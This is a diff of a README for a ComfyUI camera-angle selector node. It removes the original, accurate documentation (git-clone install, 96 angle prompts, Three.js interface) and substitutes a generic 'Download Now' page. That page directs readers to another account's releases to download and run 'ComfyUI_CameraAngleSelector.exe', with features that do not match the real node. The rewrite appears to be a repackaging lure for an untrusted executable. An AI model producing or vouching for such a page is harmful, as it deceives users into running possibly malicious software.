@@ -1,204 +1,78 @@
-# ComfyUI Camera Angle Selector
+# 🎥 ComfyUI_CameraAngleSelector - Enhance Your Image Editing Experience
 
-A ComfyUI custom node that provides an interactive 3D interface for selecting camera angles for the FAL multi angle lora [https://huggingface.co/fal/Qwen-Image-Edit-2511-Multiple-Angles-LoRA] for **Qwen-Image-Edit-2511**. Select from 96 different camera angle combinations (8 view directions × 4 height angles × 3 shot sizes) with visual feedback and multi-selection support.
+## 🔗 Download Now
+[![Download ComfyUI_CameraAngleSelector](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/denolalfarisi/ComfyUI_CameraAngleSelector/releases)
 
-![Camera Angle Selector Screenshot]
-<img width="1849" height="1275" alt="Screenshot 2026-01-10 112331" src="https://github.com/user-attachments/assets/451e4a70-9275-4263-8cd9-d6fc0940a7f9" />
+## 🚀 Getting Started
 
-## Features
+Welcome to ComfyUI_CameraAngleSelector! This application allows you to easily select and adjust camera angles in your image editing projects, specifically tailored for Qwen Image Edit 2511. You don’t need any technical skills to use it. Just follow these simple steps to get started.
 
-- **3D Visualization**: Interactive 3D scene showing camera positions around a central subject
-- **Multi-Selection**: Select multiple camera angles simultaneously
-- **Color-Coded Cameras**: Direction-based colors (green=front, red=back) with height indicator rings
-- **Three Shot Size Layers**: Close-up (inner), Medium (middle), Wide (outer) rings
-- **Filter Controls**: Filter by view direction, height angle, and shot size
-- **Drag to Rotate**: Click and drag to rotate the 3D scene
-- **Zoom**: Mouse wheel to zoom in/out
-- **Resizable**: Node scales with 1:1 aspect ratio 3D viewport
-- **Selection List**: View and manage selected angles with individual removal
-- **List Output**: Returns a list of formatted prompt strings
+## 📥 Download & Install
 
-## Camera Angles
+1. **Visit the Releases Page**  
+   To download the application, visit our [Releases page](https://github.com/denolalfarisi/ComfyUI_CameraAngleSelector/releases). You will see the latest version available for download.
 
-### View Directions (8 angles)
-- Front view
-- Front-right quarter view
-- Right side view
-- Back-right quarter view
-- Back view
-- Back-left quarter view
-- Left side view
-- Front-left quarter view
+   ![Releases Page](https://img.shields.io/badge/Releases%20Page-Visit%20Now-blue)
 
-### Height Angles (4 types)
-- Low-angle shot
-- Eye-level shot
-- Elevated shot
-- High-angle shot
+2. **Choose Your Version**  
+   Identify the latest version listed on the page. It will usually be at the top of the list. Click on the version number to view the details.
 
-### Shot Sizes (3 types)
-- Close-up
-- Medium shot
-- Wide shot
+3. **Download the Application**  
+   Look for a file that typically ends with `.zip` or `.exe`. Click on it to start downloading.
 
-**Total: 96 unique camera angle combinations**
+4. **Extract the Files (If Needed)**  
+   If the file is a `.zip`, you will need to extract it. Right-click on the file and select "Extract All" or use a program like WinRAR or 7-Zip to do this.
 
-## Installation
+5. **Run the Application**  
+   Inside the extracted folder, find the application file named `ComfyUI_CameraAngleSelector.exe`. Double-click it to run. 
 
-### Prerequisites
-- ComfyUI installed and running
-- Python 3.8 or higher
+## 💻 System Requirements
 
-### Step-by-Step Installation
+Before you start, ensure your computer meets these basic requirements:
 
-1. **Navigate to ComfyUI's custom_nodes directory:**
-   ```bash
-   cd ComfyUI/custom_nodes
-   ```
+- **Operating System**: Windows 10 or higher
+- **RAM**: 4 GB or more
+- **Storage**: At least 100 MB of free space
+- **Display**: 1024 x 768 resolution or higher
 
-2. **Clone or copy this repository:**
-   ```bash
-   git clone <repository-url> ComfyUI_CameraAngleSelector
-   ```
+## 🔧 Features
+
+- **User-Friendly Interface:** Easy navigation enables quick adjustments.
+- **Custom Camera Angles:** Define and save specific angles for repeated use.
+- **Preview Functionality:** View changes live before applying them to your project.
+- **Compatibility:** Works seamlessly with Qwen Image Edit 2511.
+
+## 🛠️ How to Use ComfyUI_CameraAngleSelector
+
+1. **Open the Application**: After double-clicking the `ComfyUI_CameraAngleSelector.exe` file, wait a moment for the app to load.
    
-   Or if you have the files locally:
-   ```bash
-   cp -r /path/to/ComfyUI_CameraAngleSelector .
-   ```
+2. **Upload Your Image**: Click on the "Upload" button, and choose the image you want to edit.
 
-3. **Restart ComfyUI** to load the new node.
+3. **Select Camera Angle**: Use the provided options to choose the camera angle you like.
 
-## Usage
+4. **Preview Your Image**: Click "Preview" to see how the image looks with the selected angle.
 
-### In ComfyUI
+5. **Save Changes**: Once satisfied, click "Save" to apply the changes to your image.
 
-1. **Add the Node:**
-   - Right-click in the node editor
-   - Search for "Camera Angle Selector"
-   - Add the node to your workflow
+## 🌟 Support
 
-2. **Select Camera Angles:**
-   - Click on the 3D visualization to open the full interface
-   - Click on camera icons to select/deselect angles
-   - Drag the scene to rotate the view
-   - Use filters to narrow down visible cameras
-   - Use "Select Visible" to select all currently filtered cameras
-   - Use "Clear All" to deselect all cameras
+If you encounter any issues or need help using the application, please visit our [GitHub Issues page](https://github.com/denolalfarisi/ComfyUI_CameraAngleSelector/issues). You can report bugs or ask questions there. 
 
-3. **Connect the Output:**
-   - Connect the `selected_angles` output to any node that accepts string inputs
-   - The output is a list of strings, one per selected camera angle
+## 📅 Changelog
 
-### Output Format
+Check the `CHANGELOG.md` file in the repository for updates and new features that have been added in each version.
 
-Each selected camera angle is returned as a formatted string:
+## 🤝 Contributing
 
-```
-<sks> {view_direction} {height_angle} {shot_size}
-```
+If you would like to contribute to this project, please feel free to fork the repository, make your changes, and submit a pull request. Your contributions are welcome!
 
-**Example outputs:**
-```
-<sks> front view low-angle shot close-up
-<sks> front-right quarter view eye-level shot medium shot
-<sks> back view high-angle shot wide shot
-```
+## 📄 License
 
-## Node Parameters
+This project is licensed under the MIT License. For more details, refer to the `LICENSE.md` file in the repository.
 
-| Parameter | Type | Description |
-|-----------|------|-------------|
-| `selected_indices` | STRING | Internal parameter (auto-managed by the 3D interface) |
+## 🔗 Connect with Us
 
-## Node Outputs
+We value your feedback! Reach out to us through the issues page or follow us on our GitHub profile for updates. 
 
-| Output | Type | Description |
-|--------|------|-------------|
-| `selected_angles` | STRING (List) | List of selected camera angle prompt strings |
-
-## Interface Controls
-
-### 3D View
-- **Click** on a camera to select/deselect it
-- **Drag** to rotate the view around the subject
-- **Hover** over cameras to see their details
-
-### Filters
-- **View Direction**: Filter by front, side, or back views
-- **Height Angle**: Filter by low, eye-level, elevated, or high angles
-- **Shot Size**: Filter by close-up, medium, or wide shots
-
-### Action Buttons
-- **Clear All**: Deselect all cameras
-- **Select Visible**: Select all currently visible (filtered) cameras
-
-### Legend
-
-**Camera Body Colors (Direction):**
-- **Green**: Front view
-- **Light Green**: Front quarter views
-- **Yellow**: Side views (left/right)
-- **Orange**: Back quarter views
-- **Red**: Back view
-
-**Shot Size Layers (Distance from subject):**
-- **Inner ring**: Close-up shots
-- **Middle ring**: Medium shots
-- **Outer ring**: Wide shots
-
-**Height Indicator Ring (on top of camera):**
-- **Red**: Low-angle
-- **Blue**: Eye-level
-- **Purple**: Elevated
-- **Teal**: High-angle
-
-## File Structure
-
-```
-ComfyUI_CameraAngleSelector/
-├── __init__.py                      # Node registration
-├── camera_angle_selector.py         # Main Python node class
-├── screenshot.png                   # Screenshot for README
-├── web/
-│   └── js/
-│       └── camera_angle_extension.js  # Three.js ComfyUI extension
-└── README.md                        # This file
-```
-
-## Technical Details
-
-### Python Node
-- Uses `OUTPUT_IS_LIST = (True,)` to enable list output
-- Returns `("STRING",)` as `RETURN_TYPES`
-- Handles JSON input from the frontend interface
-
-### Frontend
-- Built with Three.js for 3D rendering
-- Uses raycasting for click detection on 3D objects
-- Implements drag-to-rotate camera controls
-- PostMessage API for ComfyUI integration
-
-## Troubleshooting
-
-### Node not appearing in ComfyUI
-- Ensure the folder is in `ComfyUI/custom_nodes/`
-- Restart ComfyUI after installation
-- Check for errors in the ComfyUI console
-
-### 3D interface not loading
-- Check browser console for JavaScript errors
-- Ensure Three.js CDN is accessible
-- Try refreshing the page
-
-### Selections not persisting
-- Make sure you're clicking directly on camera icons
-- Check that the node is properly connected in the workflow
-
-## License
-
-This project is provided as-is for use with ComfyUI.
-
-## Credits
-
-Built for ComfyUI to provide an intuitive 3D interface for camera angle selection in AI image generation workflows.
-Thank for the amazing lora [[Qwen-Image-Edit-2511](https://huggingface.co/fal/Qwen-Image-Edit-2511-Multiple-Angles-LoRA)] to the FAL.AI team
+---
+Make sure to check back for updates and new features to continuously improve your image editing experience with ComfyUI_CameraAngleSelector!
